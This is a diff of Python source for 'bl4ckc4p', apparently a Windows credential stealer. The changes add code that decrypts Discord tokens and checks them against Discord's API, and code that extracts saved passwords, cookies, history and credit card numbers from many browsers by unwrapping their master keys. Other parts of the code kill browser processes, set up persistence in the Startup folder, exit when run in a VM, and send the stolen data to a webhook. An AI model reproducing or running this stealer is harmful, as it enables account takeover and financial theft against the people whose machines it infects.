@@ -60,7 +60,7 @@ __config__ = {
     'pingtype': '%ping_type%',
     'fake_error':'%_error_enabled%',
     'startup': '%_startup_enabled%',
-    'kill_discord_process': "%kill_discord_process%",
+    'kill_discord_process': '%kill_discord_process%',
     'dbugkiller': '%_debugkiller%',
     'blprggg':
     [
@@ -97,6 +97,8 @@ __config__ = {
     ]
 
 }
+
+
 
 
 infocom = os.getlogin()
@@ -205,7 +207,6 @@ class Functions(object):
 
 
 
-
 class bl4ckc4p(Functions):
     def __init__(self):
         
@@ -218,6 +219,8 @@ class bl4ckc4p(Functions):
         self.pingtype = self.fetch_conf("pingtype")
 
         self.pingonrun = self.fetch_conf("ping")
+        
+        self.baseurl = "https://discord.com/api/v9/users/@me"
 
         self.startupexe = self.fetch_conf("startup")
         
@@ -239,20 +242,21 @@ class bl4ckc4p(Functions):
 
         self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-
-
         self.h00ksreg = "api/webhooks"
 
         self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
         
-        self.rgxexmp = regex;
+        self.baseurl = "https://discord.com/api/v9/users/@me"
 
-        self.ecrprgxx = r"dQw4w9WgXcQ:[^\"]*";
+        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
+
+        self.tokens = []
+
+        self.ids = []
 
         self.sep = os.sep;
-
-        self.tokens = [];
 
         self.robloxcookies = [];
 
@@ -261,6 +265,8 @@ class bl4ckc4p(Functions):
 
         os.makedirs(self.dir, exist_ok=True);
 
+
+    
 
     def hiding(self: str) -> str:
         if self.hide == "yes":
@@ -300,6 +306,8 @@ class bl4ckc4p(Functions):
                 copy2(argv[0], startup_path)
 
 
+
+
     def _bexit(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
@@ -314,6 +322,33 @@ class bl4ckc4p(Functions):
         return wrapper
 
     async def init(self):
+        self.browsers = {
+            'amigo': self.appdata + '\\Amigo\\User Data',
+            'torch': self.appdata + '\\Torch\\User Data',
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+        }
+
+        self.profiles = [
+            'Default',
+            'Profile 1',
+            'Profile 2',
+            'Profile 3',
+            'Profile 4',
+            'Profile 5',
+        ]
 
         if self.w3bh00k == "" or self.w3bh00k == "\x57EBHOOK_HERE":
             self._bexit()
@@ -324,7 +359,6 @@ class bl4ckc4p(Functions):
         self.startupblackcap()
 
         if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
-
             self._bexit()
         await self.bypbd()
         await self.byptknp()
@@ -337,6 +371,27 @@ class bl4ckc4p(Functions):
             await self.kllprcsx()
 
 
+
+        os.makedirs(ntpath.join(self.dir, 'Browsers'), exist_ok=True)
+        for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
+
+            self.masterkey = self.gtmk3y(path + '\\Local State')
+            self.funcs = [
+                self.grbcook,
+                self.gethistez,
+                self.grbpsw2,
+                self.getccez
+            ]
+
+            for profile in self.profiles:
+                for func in self.funcs:
+                    try:
+                        func(name, path, profile)
+                    except:
+                        pass
+            
         if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
             os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
             function_list.extend([self.grbpsw, self.grbcoke, self.grbhis])
@@ -354,18 +409,6 @@ class bl4ckc4p(Functions):
         self.ending()
 
     
-    async def ch3ktkn(self, tkn: str) -> str:
-        try:
-            r = httpx.get(
-                url=self.dscap1,
-                headers=self.g3t_H(tkn),
-                timeout=5.0
-            )
-        except (httpx.ConnectTimeout, httpx.TimeoutException):
-            pass
-        if r.status_code == 200 and tkn not in self.tokens:
-            self.tokens.append(tkn)
-            
 
     async def _1ject(self):
         # TO DO: reduce cognetive complexity
@@ -468,8 +511,28 @@ class bl4ckc4p(Functions):
                 f.write(content)
 
     @trexctrac
+    def decrypt_val(self, buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        except Exception:
+            return "Failed to decrypt password"
+
+    def get_master_key(self, path):
+        with open(path, "r", encoding="utf-8") as f:
+            c = f.read()
+        local_state = json.loads(c)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+
     def grbtkn(self):
-        passee = {
+        paths = {
             'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
             'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
@@ -485,56 +548,144 @@ class bl4ckc4p(Functions):
             'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
             'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.chrmmuserdtt + '\\Default\\Local Storage\\leveldb\\',
+            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
+            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
+            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
+            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
+            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-        }
+            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
 
-        for name, path in passee.items():
-
-            if not ntpath.exists(path):
+        for name, path in paths.items():
+            if not os.path.exists(path):
                 continue
-
             disc = name.replace(" ", "").lower()
-
             if "cord" in path:
-
-                if ntpath.exists(self.roaming + f'\\{disc}\\Local State'):
-                    for f1lenom in os.listdir(path):
-
-                        if f1lenom[-3:] not in ["log", "ldb"]:
+                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
                             continue
-
-                        for line in [x.strip() for x in open(f'{path}\\{f1lenom}', errors='ignore').readlines() if x.strip()]:
-
-                            for y in re.findall(self.ecrprgxx, line):
-                                token = self.dcrpt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.gtmk3y(self.roaming + f'\\{disc}\\Local State'))
-                                asyncio.run(self.ch3ktkn(token))
-
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in re.findall(self.encrypted_regex, line):
+                                try:
+                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                except ValueError:
+                                    pass
+                                try:
+                                    r = requests.get(self.baseurl, headers={
+                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                        'Content-Type': 'application/json',
+                                        'Authorization': token})
+                                except Exception:
+                                    pass
+                                if r.status_code == 200:
+                                    uid = r.json()['id']
+                                    if uid not in self.ids:
+                                        self.tokens.append(token)
+                                        self.ids.append(uid)
             else:
-                for f1lenom in os.listdir(path):
-                    if f1lenom[-3:] not in ["log", "ldb"]:
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{f1lenom}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.rgxexmp, line):
-                            asyncio.run(self.ch3ktkn(token))
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regex, line):
+                            try:
+                                r = requests.get(self.baseurl, headers={
+                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                    'Content-Type': 'application/json',
+                                    'Authorization': token})
+                            except Exception:
+                                pass
+                            if r.status_code == 200:
+                                uid = r.json()['id']
+                                if uid not in self.ids:
+                                    self.tokens.append(token)
+                                    self.ids.append(uid)
 
-
-        if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-
+        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-
                 for _file in files:
                     if not _file.endswith('.sqlite'):
                         continue
-
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.rgxexmp, line):
-                            asyncio.run(self.ch3ktkn(token))
+                        for token in re.findall(self.regex, line):
+                            try:
+                                r = requests.get(self.baseurl, headers={
+                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                    'Content-Type': 'application/json',
+                                    'Authorization': token})
+                            except Exception:
+                                pass
+                            if r.status_code == 200:
+                                uid = r.json()['id']
+                                if uid not in self.ids:
+                                    self.tokens.append(token)
+                                    self.ids.append(uid)
+
+
+
+
+
+                                    
+
+    def randomdircreator(self, _dir: str or os.PathLike = gettempdir()):
+        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, file_name)
+        open(path, "x")
+        return path
+
+
+    @trexctrac
+    def grbpsw2(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
+
+        loginvault = self.randomdircreator()
+        copy2(path, loginvault)
+        conn = sqlite3.connect(loginvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                url, username, password = res
+                password = self.dcrpt_val(password, self.masterkey)
+                if url != "":
+                    f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {password}\n\n")
+        cursor.close()
+        conn.close()
+        os.remove(loginvault)
+
+    @trexctrac
+    def grbcook(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Network\\Cookies'
+        if not os.path.isfile(path):
+            return
+        cookievault = self.randomdircreator()
+        copy2(path, cookievault)
+        conn = sqlite3.connect(cookievault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
+                value = self.dcrpt_val(encrypted_value, self.masterkey)
+                if host_key and name and value != "":
+                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
+                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
+        cursor.close()
+        conn.close()
+        os.remove(cookievault)
+
+
+
+
+
+
+
 
     @trexctrac
     def grbpsw(self):
@@ -593,6 +744,46 @@ class bl4ckc4p(Functions):
                 conn.close()
                 os.remove(login)
         f.close()
+
+    def gethistez(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\History'
+        if not os.path.isfile(path):
+            return
+        historyvault = self.randomdircreator()
+        copy2(path, historyvault)
+        conn = sqlite3.connect(historyvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All History.txt"), 'a', encoding="utf-8") as f:
+            sites = []
+            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                url, title, visit_count, last_visit_time = res
+                if url and title and visit_count and last_visit_time != "":
+                    sites.append((url, title, visit_count, last_visit_time))
+            sites.sort(key=lambda x: x[3], reverse=True)
+            for site in sites:
+                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
+        cursor.close()
+        conn.close()
+        os.remove(historyvault)
+
+    def getccez(self, name: str, path: str, profile: str):
+        path += '\\' + profile + '\\Web Data'
+        if not os.path.isfile(path):
+            return
+        cardvault = self.randomdircreator()
+        copy2(path, cardvault)
+        conn = sqlite3.connect(cardvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
+            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                if name_on_card and card_number_encrypted != "":
+                    f.write(
+                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\n")
+        f.close()
+        cursor.close()
+        conn.close()
+        os.remove(cardvault)
 
 
     @trexctrac
@@ -682,7 +873,7 @@ class bl4ckc4p(Functions):
             billing = bool(len(json.loads(httpx.get(self.dscap1 + "/billing/payment-sources", headers=self.g3t_H(token)).text)) > 0)
 
 
-            f.write(f"{' '*17}{user}\n{'-'*50}\nBilling?: {billing}\nNitro Type: {has_nitro}\nBadges: {badges}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
+            f.write(f"{' '*17}{user}\n{'-'*50}\nBilling?: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
         f.close()
 
 
@@ -946,6 +1137,8 @@ if __name__ == "__main__" and os.name == "nt":
     asyncio.run(bl4ckc4p().init())
 
 
+
+
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
@@ -1090,7 +1283,7 @@ def upload(name, tk=''):
             {
             "fields": [
                 {
-                "name": "Found:",
+                "name": "Passwords Found:",
                 "value": ra
                 }
             ],
@@ -1122,7 +1315,7 @@ def upload(name, tk=''):
             {
             "fields": [
                 {
-                "name": "Found:",
+                "name": "Cookies Found:",
                 "value": rb
                 }
             ],
@@ -1226,7 +1419,19 @@ def getCookie(path, arg):
             Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
     writeforfile(Cookies, 'bc_allcookies')
 
-
+def checkIfProcessRunning(processName):
+    '''
+    Check if there is any running process that contains the given name processName.
+    '''
+    #Iterate over the all the running process
+    for proc in psutil.process_iter():
+        try:
+            # Check if process name contains the given name string.
+            if processName.lower() in proc.name().lower():
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return False;
 
 
 def ZipThings(path, arg, procc):
@@ -1239,7 +1444,12 @@ def ZipThings(path, arg, procc):
         pathC = path + arg
 
     if not os.path.exists(pathC): return
-    subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
+    if checkIfProcessRunning('chrome.exe'):
+        print('Yes a chrome process was running')
+        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
+    else:
+        ...
+        
 
     if "Wallet" in arg or "NationsGlory" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -1257,6 +1467,7 @@ def ZipThings(path, arg, procc):
         name = arg
 
     zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
+    print(zf)
     for file in os.listdir(pathC):
         if not ".zip" in file: zf.write(pathC + "/" + file)
     zf.close()
